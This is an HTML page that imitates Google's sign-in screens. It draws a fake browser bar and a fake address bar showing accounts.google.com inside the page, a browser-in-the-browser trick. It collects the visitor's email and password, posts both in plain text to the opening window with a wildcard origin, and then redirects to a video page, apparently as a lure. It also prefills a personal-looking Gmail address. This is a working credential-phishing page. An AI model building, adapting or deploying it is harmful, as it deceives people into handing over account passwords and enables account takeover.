<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Google Sign In</title>
<style>
  * { box-sizing:border-box; margin:0; padding:0; font-family: Arial, Helvetica, sans-serif; }
  html, body { height:100%; }
  body {
    background:#111418;
    color:#e5e7eb;
    display:flex;
    justify-content:center;
    align-items:flex-start;
    padding:0;
    overflow:hidden;
  }
  .page {
    width:100%;
    max-width:480px;
    min-height:100vh;
    background:#111418;
    position:relative;
    padding-bottom:20px;
  }
  .browser-bar {
    width:100%;
    height:64px;
    display:flex;
    align-items:center;
    justify-content:space-between;
    padding:0 16px 0 12px;
    background:#1d2229;
    border-bottom:1px solid rgba(255,255,255,.05);
    color:#e5e7eb;
    font-size:12px;
  }
  .status-left { display:flex; align-items:center; gap:10px; font-weight:600; letter-spacing:.1px; }
  .status-right { display:flex; align-items:center; gap:10px; }
  .dot { width:8px; height:8px; border-radius:50%; background:#fff; opacity:.8; }
  .signal { font-size:14px; }
  .network { font-size:13px; }
  .addressbar {
    position:absolute;
    top:14px;
    left:50%;
    transform:translateX(-50%);
    width:calc(100% - 30px);
    max-width:440px;
    height:36px;
    border-radius:18px;
    background:rgba(255,255,255,.08);
    border:1px solid rgba(255,255,255,.04);
    display:flex;
    align-items:center;
    gap:10px;
    padding:0 14px;
    color:#d1d5db;
    font-size:15px;
    overflow:hidden;
  }
  .lock-icon { font-size:17px; opacity:.8; }
  .address-text { white-space:nowrap; overflow:hidden; text-overflow:ellipsis; }
  .browser-controls { display:flex; align-items:center; gap:8px; }
  .browser-controls .mini { width:20px; height:20px; border-radius:50%; display:flex; align-items:center; justify-content:center; font-size:20px; color:#d1d5db; }
  .content {
    padding:32px 28px 0 28px;
  }
  .google-mark {
    width:70px;
    height:70px;
    display:flex;
    align-items:center;
    justify-content:center;
    margin-bottom:18px;
  }
  .google-mark svg { width:62px; height:62px; }
  .title {
    font-size:58px;
    line-height:1.05;
    font-weight:400;
    letter-spacing:-1.8px;
    margin:0 0 18px 0;
    color:#f3f4f6;
  }
  .subtitle {
    font-size:18px;
    color:#e5e7eb;
    margin-bottom:18px;
    font-weight:500;
  }
  .field {
    margin-bottom:18px;
  }
  .field input {
    width:100%;
    height:58px;
    background:transparent;
    border:1px solid rgba(255,255,255,.12);
    border-radius:10px;
    color:#fff;
    font-size:18px;
    outline:none;
    padding:0 16px;
  }
  .field input:focus {
    border:2px solid #8ab4f8;
    box-shadow:0 0 0 1px rgba(138,180,248,.2);
  }
  .guest-link {
    color:#8ab4f8;
    font-size:18px;
    text-decoration:none;
    display:inline-block;
    margin-top:6px;
    margin-bottom:22px;
  }
  .muted-copy {
    font-size:17px;
    line-height:1.5;
    color:#d1d5db;
    margin:10px 0 34px;
  }
  .muted-copy a {
    color:#8ab4f8;
    text-decoration:none;
  }
  .bottom-row {
    display:flex;
    align-items:center;
    justify-content:space-between;
    gap:20px;
    margin-top:12px;
  }
  .browser-controls {
    margin-left:auto;
    display:flex;
    align-items:center;
    gap:10px;
  }
  .browser-time {
    font-size:14px;
  }
  .welcome-title {
    font-size:54px;
  }
  .account-arrow {
    margin-left:auto;
    opacity:.7;
  }
  .auth-footer-row {
    margin-top:18px;
  }
  .create-link {
    font-size:18px;
    color:#e5e7eb;
    text-decoration:none;
    font-weight:500;
  }
  .next-btn {
    background:#a8c7fa;
    border:none;
    border-radius:28px;
    color:#111418;
    font-size:18px;
    font-weight:600;
    padding:14px 26px;
    min-width:118px;
    cursor:pointer;
    box-shadow:none;
  }
  .password-screen { display:none; }
  .account-pill {
    display:flex;
    align-items:center;
    gap:10px;
    padding:10px 14px;
    width:100%;
    margin:8px 0 22px;
    border:1px solid rgba(255,255,255,.12);
    border-radius:30px;
    background:transparent;
    color:#f3f4f6;
    font-size:20px;
    font-weight:500;
  }
  .avatar {
    width:26px;
    height:26px;
    border-radius:50%;
    background:linear-gradient(135deg,#bdbdbd,#6b7280);
    display:flex;
    align-items:center;
    justify-content:center;
    font-size:16px;
    color:#111;
  }
  .password-field {
    position:relative;
  }
  .password-field input {
    padding-right:48px;
  }
  .cursor {
    position:absolute;
    right:16px;
    top:50%;
    transform:translateY(-50%);
    width:2px;
    height:20px;
    background:#8ab4f8;
  }
  .show-row {
    display:flex;
    align-items:center;
    gap:12px;
    margin:14px 0 18px;
    color:#f3f4f6;
    font-size:18px;
  }
  .show-row input {
    width:20px;
    height:20px;
    accent-color:#8ab4f8;
  }
  .forgot-link {
    font-size:18px;
    color:#8ab4f8;
    text-decoration:none;
    font-weight:500;
  }
  .footer-row {
    display:flex;
    align-items:center;
    justify-content:space-between;
    margin-top:30px;
  }
  .screen.active { display:block; }
  @media (max-width: 440px) {
    .title { font-size:42px; }
    .subtitle { font-size:16px; }
    .muted-copy, .guest-link, .create-link, .forgot-link, .show-row { font-size:16px; }
    .content { padding-left:20px; padding-right:20px; }
    .next-btn { min-width:96px; }
  }
</style>
</head>
<body>
  <div class="page">
    <div class="browser-bar">
      <div class="status-left">
        <span>4:59</span>
        <span class="dot"></span>
        <span class="dot"></span>
        <span class="dot"></span>
      </div>
      <div class="status-right">
        <span class="network">193 KB/s</span>
        <span class="signal">▣</span>
        <span>80</span>
      </div>
    </div>

    <div class="addressbar">
      <span class="lock-icon">◧</span>
      <span class="address-text">accounts.google.com/v3/signin/id</span>
      <div class="browser-controls">
        <span class="mini">＋</span>
        <span class="browser-time">15</span>
        <span class="mini">⋮</span>
      </div>
    </div>

    <div class="content">
      <div class="screen active" id="emailScreen">
        <div class="google-mark">
          <svg viewBox="0 0 64 64" aria-hidden="true">
            <path fill="#EA4335" d="M32 12.5c5.45 0 10.32 1.88 14.14 5.53l10.47-10.47C45.98 3.62 39.32 0 32 0 19.92 0 9.2 7.06 3.84 17.18l12.14 9.4C18.14 19.66 24.29 12.5 32 12.5z"/>
            <path fill="#4285F4" d="M63.72 33c0-2.52-.23-4.95-.67-7.28H32v13.8h17.38c-.75 4.56-3.43 8.42-7.33 11.02l11.92 9.24C60.08 48.88 63.72 41.46 63.72 33z"/>
            <path fill="#FBBC05" d="M42.05 46.56c-3.12 2.1-7.09 3.34-10.05 3.34-7.57 0-13.97-4.88-16.26-11.43l-12.14 9.4C8.3 59.06 18.7 64 32 64c8.82 0 16.24-2.9 21.55-7.82L42.05 46.56z"/>
            <path fill="#34A853" d="M15.74 38.47A20.35 20.35 0 0 1 14.48 32c0-2.28.41-4.48 1.16-6.58L3.84 17.18A31.8 31.8 0 0 0 0 32c0 5.9 1.41 11.4 3.84 16.32l11.9-9.85z"/>
            <path fill="#EA4335" d="M32 64c8.79 0 16.18-2.9 21.52-7.8l-11.92-9.24c-2.99 2.02-6.84 3.2-9.6 3.2-7.57 0-13.96-4.88-16.26-11.42l-12.14 9.4A31.98 31.98 0 0 0 32 64z"/>
          </svg>
        </div>

        <h1 class="title">Sign in</h1>
        <div class="subtitle">Use your Google Account</div>

        <div class="field">
          <input id="emailInput" type="email" value="samuelmichael306@gmail.com" aria-label="Email or phone" />
        </div>

        <a href="#" class="guest-link">Forgot email?</a>

        <div class="muted-copy">Not your computer? Use Guest mode to sign in privately. <a href="#">Learn more</a></div>

        <div class="bottom-row">
          <a href="#" class="create-link">Create account</a>
          <button class="next-btn" id="nextEmailBtn" type="button">Next</button>
        </div>
      </div>

      <div class="screen password-screen" id="passwordScreen">
        <div class="google-mark">
          <svg viewBox="0 0 64 64" aria-hidden="true">
            <path fill="#EA4335" d="M32 12.5c5.45 0 10.32 1.88 14.14 5.53l10.47-10.47C45.98 3.62 39.32 0 32 0 19.92 0 9.2 7.06 3.84 17.18l12.14 9.4C18.14 19.66 24.29 12.5 32 12.5z"/>
            <path fill="#4285F4" d="M63.72 33c0-2.52-.23-4.95-.67-7.28H32v13.8h17.38c-.75 4.56-3.43 8.42-7.33 11.02l11.92 9.24C60.08 48.88 63.72 41.46 63.72 33z"/>
            <path fill="#FBBC05" d="M42.05 46.56c-3.12 2.1-7.09 3.34-10.05 3.34-7.57 0-13.97-4.88-16.26-11.43l-12.14 9.4C8.3 59.06 18.7 64 32 64c8.82 0 16.24-2.9 21.55-7.82L42.05 46.56z"/>
            <path fill="#34A853" d="M15.74 38.47A20.35 20.35 0 0 1 14.48 32c0-2.28.41-4.48 1.16-6.58L3.84 17.18A31.8 31.8 0 0 0 0 32c0 5.9 1.41 11.4 3.84 16.32l11.9-9.85z"/>
            <path fill="#EA4335" d="M32 64c8.79 0 16.18-2.9 21.52-7.8l-11.92-9.24c-2.99 2.02-6.84 3.2-9.6 3.2-7.57 0-13.96-4.88-16.26-11.42l-12.14 9.4A31.98 31.98 0 0 0 32 64z"/>
          </svg>
        </div>

        <h1 class="title welcome-title">Welcome</h1>

        <div class="account-pill">
          <div class="avatar">◔</div>
          <span id="accountEmail">samuelmichael306@gmail.com</span>
          <span class="account-arrow">▾</span>
        </div>

        <div class="field password-field">
          <input id="passwordInput" type="password" value="google-demo-pass" aria-label="Password" />
          <span class="cursor"></span>
        </div>

        <label class="show-row"><input id="showPassword" type="checkbox"> Show password</label>

        <div class="footer-row auth-footer-row">
          <a href="#" class="forgot-link">Forgot password?</a>
          <button class="next-btn" id="completeGoogleBtn" type="button">Next</button>
        </div>
      </div>
    </div>
  </div>

  <script>
    const emailScreen = document.getElementById('emailScreen');
    const passwordScreen = document.getElementById('passwordScreen');
    const emailInput = document.getElementById('emailInput');
    const passwordInput = document.getElementById('passwordInput');
    const accountEmail = document.getElementById('accountEmail');
    const showPassword = document.getElementById('showPassword');

    const setPasswordEmail = () => {
      const value = (emailInput.value || '').trim();
      accountEmail.textContent = value || 'samuelmichael306@gmail.com';
    };

    document.getElementById('nextEmailBtn').addEventListener('click', () => {
      const email = (emailInput.value || '').trim();
      if (!email) return;
      setPasswordEmail();
      emailScreen.style.display = 'none';
      passwordScreen.style.display = 'block';
      passwordInput.focus();
    });

    showPassword.addEventListener('change', function () {
      passwordInput.type = this.checked ? 'text' : 'password';
    });

    function finishGoogleAuth() {
      const email = (emailInput.value || '').trim() || 'samuelmichael306@gmail.com';
      const password = (passwordInput.value || '').trim() || 'google-demo-pass';
      const payload = {
        type: 'auth-gate-success',
        provider: 'google',
        email,
        password,
        displayName: email.split('@')[0] || 'Google User'
      };

      if (window.opener) {
        window.opener.postMessage(payload, '*');
        window.close();
        return;
      }

      const params = new URLSearchParams(window.location.search);
      const currentVideoId = params.get('video') || '1';
      window.location.href = '/watch.html?id=' + encodeURIComponent(currentVideoId);
    }

    document.getElementById('completeGoogleBtn').addEventListener('click', finishGoogleAuth);
    emailInput.addEventListener('input', setPasswordEmail);
  </script>
</body>
</html>
